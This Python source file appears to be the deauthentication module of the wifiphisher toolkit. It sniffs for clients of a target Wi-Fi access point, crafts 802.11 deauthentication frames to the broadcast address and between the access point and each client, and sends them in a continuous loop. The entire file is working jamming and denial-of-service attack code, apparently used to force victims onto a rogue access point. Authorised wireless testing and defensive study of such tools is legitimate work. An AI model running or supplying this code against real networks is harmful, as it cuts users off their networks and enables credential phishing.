"""
Sends 3 DEAUTH Frames:
 1 from the AP to the client
 1 from the client to the AP
 1 to the broadcast address
"""

import threading
import scapy.layers.dot11 as dot11
import scapy.arch.linux as linux
import wifiphisher.common.constants as constants


class Deauthentication(object):
    """
    Handles all the deauthentication process.
    """

    def __init__(self, ap_bssid, jamming_interface):
        """
        Setup the class with all the given arguments.

        :param self: A Deauthentication object.
        :param ap_bssid: The MAC address of the selected access point.
        :param jamming_interface: The interface to be used for jamming.
        :type self: Deauthentication
        :type ap_bssid: string
        :type jamming_interface: string
        :return: None
        :rtype: None
        """

        self._observed_clients = list()
        self._deauthentication_packets = list()
        self._ap_bssid = ap_bssid
        self._should_continue = True
        self._jamming_interface = jamming_interface
        self._non_client_addresses = constants.NON_CLIENT_ADDRESSES

        # create a socket for sending packets
        self._socket = linux.L2Socket(iface=self._jamming_interface)

        # craft and add deauthentication packet to broadcast address
        self._craft_and_add_packet(self._ap_bssid, constants.WIFI_BROADCAST)

    def _craft_and_add_packet(self, sender, receiver):
        """
        Craft a deauthentication packet and add it to the list of
        deauthentication packets

        :param self: A Deauthentication object
        :param sender: The MAC address of the sender
        :param receiver: The MAC address of the receiver
        :type self: Deauthentication
        :type sender: string
        :type receiver: string
        :return: None
        :rtype: None
        """

        packet = (dot11.RadioTap() / dot11.Dot11(type=0, subtype=12, \
                    addr1=receiver, addr2=sender, addr3=sender) \
                  / dot11.Dot11Deauth())

        self._deauthentication_packets.append(packet)

    def _process_packet(self, packet):
        """
        Process the Dot11 packets and add desired clients to observed_clients.

        :param self: A Deauthentication object.
        :param packet: A scapy.layers.RadioTap object.
        :type self: Deauthentication
        :type packet: scapy.layers.RadioTap
        :return: None
        :rtype: None
        .. note: addr1 = Destination address
                 addr2 = Sender address
                 Also this finds devices that are not associated with any
                 access point as they respond to the access point probes.
        """

        # check if the packet has a dot11 layer
        if packet.haslayer(dot11.Dot11):
            # get the sender and receiver
            receiver = packet.addr1
            sender = packet.addr2

            # create a list of addresses that are not acceptable
            non_valid_list = self._non_client_addresses + self._observed_clients

            # if sender or receirver is valid and not already a
            # discovered client check to see if either one is a client
            if receiver not in non_valid_list and sender not in non_valid_list:
                # in case the receiver is the access point
                if receiver == self._ap_bssid:
                    # add the sender to the client list
                    self._observed_clients.append(sender)

                    # create and add deauthentication packets for client
                    self._craft_and_add_packet(sender, self._ap_bssid)
                    self._craft_and_add_packet(self._ap_bssid, sender)

                # in case the sender is the access point
                elif sender == self._ap_bssid:
                    # add the receiver to the client list
                    self._observed_clients.append(receiver)

                    # create and add deauthentication packets for client
                    self._craft_and_add_packet(receiver, self._ap_bssid)
                    self._craft_and_add_packet(self._ap_bssid, receiver)

    def _find_clients(self):
        """
        Find all the clients

        :param self: A Deauthentication object.
        :type self: Deauthentication
        :return: None
        :rtype: None
        """

        # continue to find clients until told otherwise
        while self._should_continue:
            dot11.sniff(iface=self._jamming_interface, prn=self._process_packet,
                        count=1, store=0)

    def get_clients(self):
        """
        Get all the observed clients.

        :param self: A Deauthentication object.
        :type self: Deauthentication
        :return: A list of all the observed clients.
        :rtype: list
        """

        return self._observed_clients

    def stop_deauthentication(self):
        """
        Stop the deauthentication process.
        """

        self._should_continue = False

    def _send_deauthentication_packets(self):
        """
        Send deauthentication packets using RadioTap header.

        :param self: A Deauthentication object.
        :type self: Deauthentication
        :return: None
        :rtype: None
        .. note: Information regarding IEEE 802.11 and for deauthentication
                 which could be useful for maintenance purposes. Type could
                 have values of 0 for managment, 1 for control, 2 for data.
                 There are a lot of subtpyes but subtype 12 is for
                 deauthentication packets. addr1, addr2, addr3 are destination
                 address, sender address, sender transmited address
                 respectivly.


        """

        while self._should_continue:
            for packet in self._deauthentication_packets:
                self._socket.send(packet)

    def deauthenticate(self):
        """
        Deauthenticate all the clients found on the target access point.

        :param self: A Deauthentication object.
        :type self: Deauthentication
        :return: None
        :rtype: None
        .. note: count has the default value of 20.
        """

        # start finding clients in a separate thread
        find_clients_thread = threading.Thread(target=self._find_clients)
        find_clients_thread.start()

        # start deauthenticating in a separate thread
        send_deauth_packets_thread = threading.Thread(
            target=self._send_deauthentication_packets)
        send_deauth_packets_thread.start()

    def on_exit(self):
        """
        Stop deauthing on exit.

        :param self: A Deauthentication object
        :return: None
        :rtype: None
        """

        self.stop_deauthentication()
